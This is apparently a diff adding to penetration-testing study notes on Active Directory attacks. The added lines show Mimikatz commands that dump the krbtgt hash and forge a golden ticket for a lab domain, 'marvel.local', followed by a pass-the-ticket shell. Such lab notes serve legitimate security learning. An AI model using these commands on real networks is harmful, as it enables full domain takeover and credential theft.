@@ -657,3 +657,33 @@ mimikatz # lsadump::lsa /patch
 * <mark style="color:yellow;">Have access to the krbtgt hash?</mark>
 * This is the Kerberos Ticket Granting Ticket account
 * This allows us to generate tickets!
+* We have complete access to the entire domain by means of being the holder of this hash!
+
+### Mimikatz
+
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /inject /name:krbtgt
+
+domain -- sid_here
+krbtgt -- hash_here
+```
+
+* You need to grab the SID of the domain
+* NTLM hash of the krbtgt account
+* Place these both in a document
+
+```
+mimikatz # kerberos::golden /User:YourDomainIsNowMine /domain:marvel.local /sid:domain_sid_here /krbtgt_hash_here /id:500 /ptt
+
+Golden ticket for 'YourDomainIsNowMine @ marvel.local' successfully submitted for current session
+```
+
+* id is the Administrator's ID for Windows which is 500
+* ptt stands for pass-the-ticket
+
+```
+mimikatz # misc::cmd
+```
